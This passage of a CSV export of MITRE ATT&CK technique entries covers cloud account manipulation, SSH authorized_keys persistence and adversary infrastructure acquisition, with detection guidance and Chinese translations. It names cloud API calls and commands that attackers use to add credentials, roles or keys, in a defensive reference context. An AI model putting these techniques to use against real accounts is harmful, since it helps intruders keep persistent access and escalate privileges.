Monitor for use of credentials at unusual times or to unusual systems or services. This may also correlate with other suspicious activity.","Azure AD, IaaS, SaaS","Active Directory: Active Directory Object Modification, User Account: User Account Modification",True,T1098,,"Alex Soler, AttackIQ; Expel; Jannie Li, Microsoft Threat Intelligence Center (MSTIC); Oleg Kolesnikov, Securonix; Zur Ulianitzky, XM Cyber",,,,,,,"(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Expel IO Evil in AWS)",篡改账户：其他云凭证,攻击者可以将攻击者控制的凭据添加到云帐户，以保持对环境中受害者帐户和实例的持久访问。例如，除了 Azure AD 中的现有合法凭据外，攻击者还可以添加服务主体和应用程序的凭据。（引文：Microsoft SolarWinds 客户指南）（引文：死亡之蓝云）（引文：死亡之蓝云视频）这些凭据包括x509 密钥和密码。（引用：Microsoft SolarWinds 客户指南）拥有足够的权限，有多种方法可以添加凭据，包括 Azure 门户、Azure 命令行界面和 Azure 或 Az PowerShell 模块。（引用：揭秘 Azure AD服务主体）在基础设施即服务 (IaaS) 环境中，通过 [Cloud Accounts] (https://attack.mitre.org/techniques/T1078/004) 获得访问权限后，攻击者可能会生成或导入自己的 SSH使用 AWS 中的 <code>CreateKeyPair</code> 或 <code>ImportKeyPair</code> API 或 GCP 中的 <code>gcloud compute os-login ssh-keys add</code> 命令的密钥。（引用：GCP SSH 密钥添加）这允许持久的无需进一步使用受感染的云帐户即可访问云环境中的实例。（引用：在 AWS 中驱逐 IO Evil）（引用：在幕后驱逐）攻击者也可以使用 AWS 中的 <code>CreateAccessKey</code> API 或GCP 中的 <code>gcloud iam service-accounts keys create</code> 命令将访问密钥添加到帐户。如果目标帐户与请求帐户具有不同的权限，则攻击者也可能能够提升他们在环境中的权限（即 [云帐户](https://attack.mitre.org/techniques/T1078/004)）。 （引用：Rhino 安全实验室 AWS 权限提升）
T1098.003,Account Manipulation: Additional Cloud Roles,"An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)
(Citation: Microsoft O365 Admin Roles) 

This account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.

For example, in Azure AD environments, an adversary with the Application Administrator role can add [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) to their application's service principal. In doing so the adversary would be able to gain the service principal’s roles and permissions, which may be different from those of the Application Administrator.(Citation: SpecterOps Azure Privilege Escalation) Similarly, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)

Similarly, an adversary with the Azure AD Global Administrator role can toggle the “Access management for Azure resources” option to gain the ability to assign privileged access to Azure subscriptions and virtual machines to Azure AD users, including themselves.(Citation: Azure AD to AD) ",https://attack.mitre.org/techniques/T1098/003,19 January 2020,24 October 2022,2.1,Persistence,Collect activity logs from IAM services and cloud administrator accounts to identify unusual activity in the assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins. ,"Azure AD, Google Workspace, IaaS, Office 365, SaaS",User Account: User Account Modification,True,T1098,,"Alex Parsons, Crowdstrike; Alex Soler, AttackIQ; Chris Romano, Crowdstrike; Clément Notin, Tenable; Microsoft Threat Intelligence Center (MSTIC); Pià Consigny, Tenable; Praetorian; Wojciech Lesicki",,,,,,,"(Citation: MSTIC DEV-0537 Mar 2022),(Citation: CrowdStrike StellarParticle January 2022),",篡改账户：其他云角色,攻击者可以向攻击者控制的云帐户添加额外的角色或权限，以保持对租户的持久访问。例如，攻击者可能会在基于云的环境中更新 IAM 策略或在 Office 365 环境中添加新的全局管理员。（引用：AWS IAM 策略和权限）（引用：Google Cloud IAM 策略）（引用：Microsoft Support O365 添加另一个管理员，2019 年 10 月）（引文：Microsoft O365 管理员角色）如果拥有足够的权限，受感染的帐户几乎可以无限制地访问数据和设置（包括重置其他管理员密码的能力）。（引文：驱逐 AWS 攻击者）（引文: Microsoft O365 Admin Roles) 此帐户修改可能会紧随[创建帐户](https://attack.mitre.org/techniques/T1136) 或其他恶意帐户活动。攻击者还可以修改他们已经入侵的现有 [有效帐户](https://attack.mitre.org/techniques/T1078)。这可能会导致权限升级，特别是如果添加的角色允许横向移动到其他帐户。例如，在 Azure AD 环境中，具有应用程序管理员角色的攻击者可以将 [附加云凭据](https://attack.mitre.org/techniques/T1098/001) 添加到其应用程序的服务主体。这样做，攻击者将能够获得服务主体的角色和权限，这可能与应用程序管理员的不同。（引用：SpecterOps Azure 权限升级）类似地，在 AWS 环境中，具有适当权限的攻击者可能能够使用 <code>CreatePolicyVersion</code> API 定义新版本的 IAM 策略或 <code>AttachUserPolicy</code> API 将具有额外或不同权限的 IAM 策略附加到受损用户帐户。（引文: Rhino Security Labs AWS Privilege Escalation) 同样，具有 Azure AD 全局管理员角色的攻击者可以切换“Azure 资源的访问管理”选项，以获得将对 Azure 订阅和虚拟机的特权访问分配给 Azure AD 用户的能力，包括（引用：Azure AD 到 AD）
T1098.002,Account Manipulation: Additional Email Delegate Permissions,"Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account. 

For example, the <code>Add-MailboxPermission</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.(Citation: Microsoft - Add-MailboxPermission)(Citation: FireEye APT35 2018)(Citation: Crowdstrike Hiding in Plain Sight 2018) In Google Workspace, delegation can be enabled via the Google Admin console and users can delegate accounts via their Gmail settings.(Citation: Gmail Delegation)(Citation: Google Ensuring Your Information is Safe) 

Adversaries may also assign mailbox folder permissions through individual folder permissions or roles. In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders. By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user’s mail folders.(Citation: Remediation and Hardening Strategies for Microsoft 365 to Defend Against UNC2452)

This may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)), so the messages evade spam/phishing detection mechanisms.(Citation: Bienstock, D. - Defending O365 - 2019)",https://attack.mitre.org/techniques/T1098/002,19 January 2020,19 April 2022,2.0,Persistence,"Monitor for unusual Exchange and Office 365 email account permissions changes that may indicate excessively broad permissions being granted to compromised accounts.

Enable the UpdateFolderPermissions action for all logon types. The mailbox audit log will forward folder permission modification events to the Unified Audit Log. Create rules to alert on ModifyFolderPermissions operations where the Anonymous or Default user is assigned permissions other than None. 

A larger than normal volume of emails sent from an account and similar phishing emails sent from  real accounts within a network may be a sign that an account was compromised and attempts to leverage access with modified email permissions is occurring.","Google Workspace, Office 365, Windows","Application Log: Application Log Content, Group: Group Modification, User Account: User Account Modification",True,T1098,,"Jannie Li, Microsoft Threat Intelligence Center (MSTIC); Microsoft Detection and Response Team (DART); Mike Burns, Mandiant; Naveen Vijayaraghavan, Nilesh Dherange (Gurucul)",,,,,,,"(Citation: MSTIC Nobelium Oct 2021),(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks),(Citation: FireEye APT35 2018),(Citation: Volexity SolarWinds),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Gmail Delegation)",篡改账户：其他电子邮件代表权限,"攻击者可以授予额外的权限级别以保持对攻击者控制的电子邮件帐户的持久访问。例如，<code>Add-MailboxPermission</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet，可在本地 Exchange 和基于云的服务 Office 中使用365，向邮箱添加权限。（引用：Microsoft - Add-MailboxPermission）（引用：FireEye APT35 2018）（引用：Crowdstrike Hiding in Plain Sight 2018）在 Google Workspace 中，可以通过 Google 管理控制台启用委派，用户可以通过其 Gmail 设置委派帐户。（引文：Gmail 委派）（引文：Google 确保您的信息安全）攻击者还可以通过单个文件夹权限或角色分配邮箱文件夹权限。在 Office 365 环境中，攻击者可能会将默认或匿名用户权限或角色分配给信息存储顶部（根）、收件箱或其他邮箱文件夹。通过为文件夹分配一个或两个用户权限，攻击者可以利用租户中的任何其他帐户来保持对目标用户的邮件文件夹的持久性。（引文：Microsoft 365 防御 UNC2452 的补救和强化策略）这可以用于在持续性威胁事件以及 BEC（商业电子邮件泄露）事件中，对手可以将 [其他云角色](https://attack.mitre.org/techniques/T1098/003) 添加到他们希望入侵的帐户中。这可以进一步使得能够使用额外的技术来获得对系统的访问权。例如，在创建收件箱规则（例如：[Internal Spearphishing](https://attack.mitre.org/techniques/T1534)）的同时，被入侵的企业帐户通常用于向目标企业网络中的其他帐户发送消息，因此这些消息会避开垃圾邮件/网络钓鱼检测机制。（引文：Bienstock, D. - Defending O365 - 2019）"
T1098.005,Account Manipulation: Device Registration,"Adversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.

MFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements. An adversary that compromises a user’s credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network.(Citation: CISA MFA PrintNightmare)(Citation: DarkReading FireEye SolarWinds)

Similarly, an adversary with existing access to a network may register a device to Azure AD and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies.(Citation: AADInternals - Device Registration)(Citation: AADInternals - Conditional Access Bypass)(Citation: Microsoft DEV-0537) 

Devices registered in Azure AD may be able to conduct [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) campaigns via intra-organizational emails, which are less likely to be treated as suspicious by the email client.(Citation: Microsoft - Device Registration) Additionally, an adversary may be able to perform a [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002) on an Azure AD tenant by registering a large number of devices.(Citation: AADInternals - BPRT)",https://attack.mitre.org/techniques/T1098/005,04 March 2022,25 April 2022,1.0,Persistence,,"Azure AD, SaaS, Windows","Active Directory: Active Directory Object Creation, Application Log: Application Log Content, User Account: User Account Modification",True,T1098,,"Mike Moran; Pawel Partyka, Microsoft 365 Defender",,,,,,,"(Citation: Volexity SolarWinds),(Citation: AADInternals Documentation),(Citation: CISA MFA PrintNightmare),(Citation: Microsoft - Device Registration)",篡改账户：设备注册,攻击者可以将设备注册到攻击者控制的帐户。设备可以在处理网络身份验证的多因素身份验证 (MFA) 系统中注册，也可以在处理设备访问和合规性的设备管理系统中注册。 MFA 系统（例如 Duo 或 Okta）允许用户将设备与其帐户相关联，以完成 MFA 要求。破坏用户凭据的攻击者可能会注册新设备，以绕过初始 MFA 要求并获得对网络的持久访问权。（引用：CISA MFA PrintNightmare）（引用：DarkReading FireEye SolarWinds）同样，具有现有访问权限的攻击者网络可以将设备注册到 Azure AD 和/或其设备管理系统 Microsoft Intune，以便在绕过条件访问策略的同时访问敏感数据或资源。（引用：AADInternals - 设备注册）（引用：AADInternals - 条件访问绕过） （引用：Microsoft DEV-0537）在 Azure AD 中注册的设备可能能够通过组织内电子邮件进行 [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) 活动，这不太可能电子邮件客户端将其视为可疑。（引用：Microsoft - 设备注册）此外，攻击者可能能够执行 [服务耗尽洪水]（https://attack.mitre.org/techniques/T1 499/002）在 Azure AD 租户上注册大量设备。（引用：AADInternals - BPRT）
T1098.004,Account Manipulation: SSH Authorized Keys,"Adversaries may modify the SSH <code>authorized_keys</code> file to maintain persistence on a victim host. Linux distributions and macOS commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The <code>authorized_keys</code> file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under <code>&lt;user-home&gt;/.ssh/authorized_keys</code>.(Citation: SSH Authorized Keys) Users may edit the system’s SSH config file to modify the directives PubkeyAuthentication and RSAAuthentication to the value “yes” to ensure public key and RSA authentication are enabled. The SSH config file is usually located under <code>/etc/ssh/sshd_config</code>.

Adversaries may modify SSH <code>authorized_keys</code> files directly with scripts or shell commands to add their own adversary-supplied public keys. In cloud environments, adversaries may be able to modify the SSH authorized_keys file of a particular virtual machine via the command line interface or rest API. For example, by using the Google Cloud CLI’s “add-metadata” command an adversary may add SSH keys to a user account.(Citation: Google Cloud Add Metadata)(Citation: Google Cloud Privilege Escalation) Similarly, in Azure, an adversary may update the authorized_keys file of a virtual machine via a PATCH request to the API.(Citation: Azure Update Virtual Machines) This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH.(Citation: Venafi SSH Key Abuse)(Citation: Cybereason Linux Exim Worm)

Where authorized_keys files are modified via cloud APIs or command line interfaces, an adversary may achieve privilege escalation on the target virtual machine if they add a key to a higher-privileged user. ",https://attack.mitre.org/techniques/T1098/004,24 June 2020,20 April 2022,1.1,Persistence,"Use file integrity monitoring to detect changes made to the <code>authorized_keys</code> file for each user on a system. Monitor for suspicious processes modifying the <code>authorized_keys</code> file. In cloud environments, monitor instances for modification of metadata and configurations.

Monitor for changes to and suspicious processes modifiying <code>/etc/ssh/sshd_config</code>.","IaaS, Linux, macOS","Command: Command Execution, File: File Modification, Process: Process Creation",True,T1098,,"Dror Alon, Palo Alto Networks; Or Kliger, Palo Alto Networks; Tony Lambert, Red Canary",,,,,,,"(Citation: trendmicro xcsset xcode project 2020),(Citation: TrendMicro EarthLusca 2022),(Citation: MacKeeper Bundlore Apr 2019),(Citation: Aqua TeamTNT August 2020),(Citation: Cisco Talos Intelligence Group),(Citation: Trend Micro Skidmap),",篡改账户：SSH 授权密钥,攻击者可能会修改 SSH <code>authorized_keys</code> 文件以在受害主机上保持持久性。 Linux 发行版和 macOS 通常使用基于密钥的身份验证来保护用于远程管理的 SSH 会话的身份验证过程。 SSH 中的 <code>authorized_keys</code> 文件指定可用于登录配置该文件的用户帐户的 SSH 密钥。该文件通常在用户主目录下的 <code><user-home>/.ssh/authorized_keys</code> 下找到。（引用：SSH 授权密钥）用户可以编辑系统的 SSH 配置文件来修改指令 PubkeyAuthentication并将 RSAAuthentication 设置为“yes”以确保启用公钥和 RSA 身份验证。 SSH 配置文件通常位于 <code>/etc/ssh/sshd_config</code> 下。攻击者可以直接使用脚本或 shell 命令修改 SSH <code>authorized_keys</code> 文件，以添加他们自己的攻击者提供的公钥。在云环境中，攻击者可能能够通过命令行界面或 REST API 修改特定虚拟机的 SSH 授权密钥文件。例如，通过使用 Google Cloud CLI 的“add-metadata”命令，攻击者可以将 SSH 密钥添加到用户帐户。（引用：Google Cloud 添加元数据）（引用：谷歌云特权升级）类似地，在 Azure 中，攻击者可以通过对 API 的 PATCH 请求更新虚拟机的 authorized_keys 文件。（引用：Azure 更新虚拟机）这确保了拥有相应私钥的攻击者可以通过 SSH 以现有用户身份登录。（引用：Venafi SSH 密钥滥用）（引用：Cybereason Linux Exim Worm）在通过云 API 或命令行界面修改授权密钥文件的情况下，如果攻击者向更高权限的用户添加密钥，他们可能会在目标虚拟机上实现权限提升。
T1583,Acquire Infrastructure,"Adversaries may buy, lease, or rent infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services.(Citation: TrendmicroHideoutsLease) Additionally, botnets are available for rent or purchase.

Use of these infrastructure solutions allows an adversary to stage, launch, and execute an operation. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contact to third-party web services. Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.",https://attack.mitre.org/techniques/T1583,30 September 2020,17 October 2021,1.1,Resource Development,"Consider use of services that may aid in tracking of newly acquired infrastructure, such as WHOIS databases for domain registration information. 

Once adversaries have provisioned infrastructure (ex: a server for use in command and control), internet scans may help proactively discover adversary acquired infrastructure. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: Mandiant SCANdalous Jul 2020)(Citation: Koczwara Beacon Hunting Sep 2021)

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.",PRE,"Domain Name: Active DNS, Domain Name: Domain Registration, Domain Name: Passive DNS, Internet Scan: Response Content, Internet Scan: Response Metadata",False,,,,,,,,,,",",获取基础设施,攻击者可能会购买、租赁或租用可在定位期间使用的基础设施。存在各种各样的基础设施来托管和编排对手的操作。基础架构解决方案包括物理或云服务器、域和第三方 Web 服务。（引用：TrendmicroHideoutsLease）此外，僵尸网络可供出租或购买。使用这些基础设施解决方案可以让对手进行、启动和执行操作。解决方案可以帮助对手的操作融入被视为正常的流量，例如与第三方 Web 服务的联系。根据实施情况，攻击者可能会使用难以与他们进行物理绑定的基础设施，也可能会使用可以快速配置、修改和关闭的基础设施。
T1583.005,Acquire Infrastructure: Botnet,"Adversaries may buy, lease, or rent a network of compromised systems that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.(Citation: Norton Botnet) Adversaries may purchase a subscription to use an existing botnet from a booter/stresser service. With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566) or Distributed Denial of Service (DDoS).(Citation: Imperva DDoS for Hire)(Citation: Krebs-Anna)(Citation: Krebs-Bazaar)(Citation: Krebs-Booter)",https://attack.mitre.org/techniques/T1583/005,01 October 2020,15 April 2021,1.0,Resource Development,"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during [Phishing](https://attack.mitre.org/techniques/T1566), [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499), or [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",PRE,,True,T1583,,,,,,,,,",",获取基础设施：僵尸网络,攻击者可能会购买、租赁或租用可在定位期间使用的受感染系统网络。僵尸网络是受感染系统的网络，可以被指示执行协调任务。（引用：诺顿僵尸网络）攻击者可以购买订阅以使用来自引导程序/压力服务的现有僵尸网络。借助僵尸网络，攻击者可以执行后续活动，例如大规模 [网络钓鱼](https://attack.mitre.org/techniques/T1566) 或分布式拒绝服务 (DDoS)。（引文：Imperva DDoS 出租）（引用：Krebs-Anna）（引用：Krebs-Bazaar）（引用：Krebs-Booter）
T1583.002,Acquire Infrastructure: DNS Server,"Adversaries may set up their own Domain Name System (DNS) servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)). Instead of hijacking existing DNS servers, adversaries may opt to configure and run their own DNS servers in support of operations.

By running their own DNS servers, adversaries can have more control over how they administer server-side DNS C2 traffic ([DNS](https://attack.mitre.org/techniques/T1071/004)). With control over a DNS server, adversaries can configure DNS applications to provide conditional responses to malware and, generally, have more flexibility in the structure of the DNS-based C2 channel.(Citation: Unit42 DNS Mar 2019)",https://attack.mitre.org/techniques/T1583/002,01 October 2020,15 April 2021,1.0,Resource Development,"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.",PRE,,True,T1583,,,,,,,,,"(Citation: Zscaler Lyceum DnsSystem June 2022),(Citation: Novetta-Axiom),",获取基础设施：DNS 服务器,攻击者可能会设置自己的域名系统 (DNS) 服务器，以便在定位期间使用。在攻击后活动期间，攻击者可能会将 DNS 流量用于各种任务，包括命令和控制（例如：[应用层协议](https://attack.mitre.org/techniques/T1071)）。攻击者可以选择配置和运行自己的 DNS 服务器来支持操作，而不是劫持现有的 DNS 服务器。通过运行自己的 DNS 服务器，攻击者可以更好地控制他们如何管理服务器端 DNS C2 流量 ([DNS](https://attack.mitre.org/techniques/T1071/004))。通过控制 DNS 服务器，攻击者可以配置 DNS 应用程序以提供对恶意软件的条件响应，并且通常在基于 DNS 的 C2 通道的结构上具有更大的灵活性。（引用：Unit42 DNS Mar 2019）
T1583.001,Acquire Infrastructure: Domains,"Adversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.

Adversaries may use acquired domains for a variety of purposes, including for [Phishing](https://attack.mitre.org/techniques/T1566), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), and Command and Control.(Citation: CISA MSS Sep 2020) Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD).(Citation: FireEye APT28)(Citation: PaypalScam) Typosquatting may be used to aid in delivery of payloads via [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). Adversaries may also use internationalized domain names (IDNs) and different character sets (e.g. Cyrillic, Greek, etc.) to execute ""IDN homograph attacks,"" creating visually similar lookalike domains used to deliver malware to victim machines.(Citation: CISA IDN ST05-016)(Citation: tt_httrack_fake_domains)(Citation: tt_obliqueRAT)(Citation: httrack_unhcr)(Citation: lazgroup_idn_phishing)

Adversaries may also acquire and repurpose expired domains, which may be potentially already allowlisted/trusted by defenders based on an existing reputation/history.(Citation: Categorisation_not_boundary)(Citation: Domain_Steal_CC)(Citation: Redirectors_Domain_Fronting)(Citation: bypass_webproxy_filtering)

Domain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.(Citation: Mandiant APT1)",https://attack.mitre.org/techniques/T1583/001,30 September 2020,18 October 2022,1.2,Resource Development,"Domain registration information is, by design, captured in public registration logs. Consider use of services that may aid in tracking of newly acquired domains, such as WHOIS databases and/or passive DNS. In some cases it may be possible to pivot on known pieces of domain registration information to uncover other infrastructure purchased by the adversary. Consider monitoring for domains created with a similar structure to your own, including under a different TLD. Though various tools and services exist to track, query, and monitor domain name registration information, tracking across multiple DNS infrastructures can require multiple tools/services or more advanced analytics.(Citation: ThreatConnect Infrastructure Dec 2020)

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access and Command and Control.",PRE,"Application Log: Application Log Content, Domain Name: Active DNS, Domain Name: Domain Registration, Domain Name: Passive DNS, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content",True,T1583,,"Deloitte Threat Library Team; Menachem Goldstein; Oleg Kolesnikov, Securonix; Vinayak Wadhwa, Lucideus; Wes Hurd",,,,CAPEC-630,,,"(Citation: ThreatConnect Kimsuky September 2020),(Citation: SecureWorks August 2019),(Citation: Mandiant APT1),(Citation: Talos Transparent Tribe May 2021),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: ClearSky Siamesekitten August 2021),(Citation: McAfee Dianxun March 2021),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Phish Labs Silent Librarian),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: CISA AA20-301A Kimsuky),(Citation: Volexity Ocean Lotus November 2020),(Citation: TrendMicro EarthLusca 2022),(Citation: FireEye SUNSHUTTLE Mar 2021),(Citation: Secureworks COBALT DICKENS August 2018),(Citation: Google TAG Lazarus Jan 2021),(Citation: FireEye APT28),(Citation: Cybereason Kimsuky November 2020),(Citation: DOJ APT10 Dec 2018),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: ESET Lazarus Jun 2020),(Citation: CISA AppleJeus Feb 2021),(Citation: Unit 42 Gamaredon February 2022),(Citation: Secureworks COBALT DICKENS September 2019),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: Malwarebytes Kimsuky June 2021),(Citation: ESET Operation Spalax Jan 2021),(Citation: Recorded Future REDDELTA July 2020),(Citation: MSTIC NOBELIUM May 2021),(Citation: Palo Alto Black-T October 2020),(Citation: Accenture MUDCARP March 2019),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Malwarebytes Silent Librarian October 2020),(Citation: Dragos Hexane),(Citation: Korean FSI TA505 2020),(Citation: Forcepoint BITTER Pakistan Oct 2016),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: DOJ Iran Indictments March 2018),(Citation: Kaspersky Winnti April 2013),(Citation: Google EXOTIC LILY March 2022),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: McAfee Honeybee),(Citation: eSentire FIN7 July 2021),(Citation: Zdnet Kimsuky Group September 2020),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: BlackBerry CostaRicto November 2020),(Citation: CISA AA20-296A Berserk Bear December 2020),(Citation: KISA Operation Muzabi),(Citation: Certfa Charming Kitten January 2021),(Citation: Proofpoint TA407 September 2019),(Citation: Microsoft Targeting Elections September 2020),(Citation: US District Court Indictment GRU Oct 2018),(Citation: Google TAG Ukraine Threat Landscape March 2022),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Checkpoint IndigoZebra July 2021),(Citation: Cylance Dust Storm),(Citation: Microsoft Actinium February 2022),",获取基础设施：域,攻击者可能会获得可在定位期间使用的域。域名是用于表示一个或多个 IP 地址的人类可读名称。它们可以购买或在某些情况下免费获得。攻击者可能将获得的域用于各种目的，包括用于 [网络钓鱼](https://attack.mitre.org/techniques/T1566)、[Drive-by Compromise](https://attack.mitre.org/techniques) /T1189）和命令与控制。（引文：CISA MSS 2020 年 9 月）攻击者可以选择与合法域相似的域，包括通过使用同形文字或使用不同的顶级域 (TLD)。（引文：FireEye APT28）（引文：PaypalScam）域名抢注可用于通过 [Drive-by Compromise]（https://attack.mitre.org/techniques/T1189）帮助交付有效载荷。攻击者还可能使用国际化域名 (IDN) 和不同的字符集（例如西里尔文、希腊文等）来执行“IDN 同形异义词攻击”，创建视觉上相似的域名，用于将恶意软件传送到受害机器。（引用：CISA IDN ST05 -016)（引文：tt_httrack_fake_domains）（引文：tt_obliqueRAT）（引文：httrack_unhcr）（引文：lazgroup_idn_phishing）攻击者还可能获取并重新利用过期的域，这些域可能已经被防御者根据现有的声誉/历史列入许可名单/信任。 （引用：Categorisation_not_boundary）（引用：Domain_Steal_CC）（引用：Redirectors_Domain_Fronting）（引用：bypass_webproxy_filtering）每个域注册商都维护一个公开可见的数据库，该数据库显示每个注册域的联系信息。私人 WHOIS 服务显示替代信息，例如他们自己的公司数据，而不是域的所有者。攻击者可能会使用此类私人 WHOIS 服务来掩盖有关谁拥有购买的域的信息。攻击者可能会通过使用不同的注册信息和购买不同域名注册商的域名来进一步中断跟踪其基础设施的努力。（引用：Mandiant APT1）
T1583.004,Acquire Infrastructure: Server,"Adversaries may buy, lease, or rent physical servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Instead of compromising a third-party [Server](https://attack.mitre.org/techniques/T1584/004) or renting a [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003), adversaries may opt to configure and run their own servers in support of operations.

Adversaries may only need a lightweight setup if most of their activities will take place using online infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems.(Citation: NYTStuxnet)",https://attack.mitre.org/techniques/T1583/004,01 October 2020,17 October 2021,1.1,Resource Development,"Once adversaries have provisioned a server (ex: for use as a command and control server), internet scans may reveal servers that adversaries have acquired. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: Mandiant SCANdalous Jul 2020)(Citation: Koczwara Beacon Hunting Sep 2021)

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.",PRE,"Internet Scan: Response Content, Internet Scan: Response Metadata",True,T1583,,,,,,,,,"(Citation: Microsoft GALLIUM December 2019),(Citation: McAfee Night Dragon),(Citation: McAfee Honeybee),(Citation: KISA Operation Muzabi),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: TrendMicro EarthLusca 2022),(Citation: FoxIT Wocao December 2019),(Citation: ESET Lazarus Jun 2020),",获取基础设施：服务器,攻击者可能会购买、租赁或租用可在定位期间使用的物理服务器。使用服务器允许攻击者准备、启动和执行操作。在攻击后活动期间，攻击者可能会利用服务器执行各种任务，包括命令和控制。而不是妥协第三方[服务器]（https://attack.mitre.org/techniques/T1584/004）或租用[虚拟专用服务器]（https://attack.mitre.org/techniques/T1583/ 003)，攻击者可以选择配置和运行自己的服务器以支持操作。如果他们的大部分活动将使用在线基础设施进行，则攻击者可能只需要一个轻量级的设置。或者，如果他们想在自己的系统上测试、交流和控制他们活动的其他方面，他们可能需要构建广泛的基础设施。（引用：NYTStuxnet）
T1583.007,Acquire Infrastructure: Serverless,"Adversaries may purchase and configure serverless cloud infrastructure, such as Cloudflare Workers or AWS Lambda functions, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them.

